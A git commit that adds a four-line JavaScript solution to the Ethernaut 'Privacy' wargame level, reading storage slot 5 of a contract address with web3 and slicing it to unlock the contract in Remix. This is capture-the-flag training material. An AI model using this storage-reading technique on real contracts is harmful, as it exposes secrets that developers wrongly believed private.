005dd98cea6fecc18a92d801b9815ca6c7dc6fd7
MinovS65 <pesopesaka@gmail.com>
2025-07-16 15:32:12 +0300

    Add files via upload

---
+++ Ethernaut/12privacy.js
@@ -0,0 +1,4 @@
+await web3.eth.getStorageAt("0x0C20C8876B0251d17c5dc099226f648e25E1E082", 5);
+indx = "paste storage slot 5"
+indx.slice(0, 34);
+//open remix and call the function and pass the result of the above call
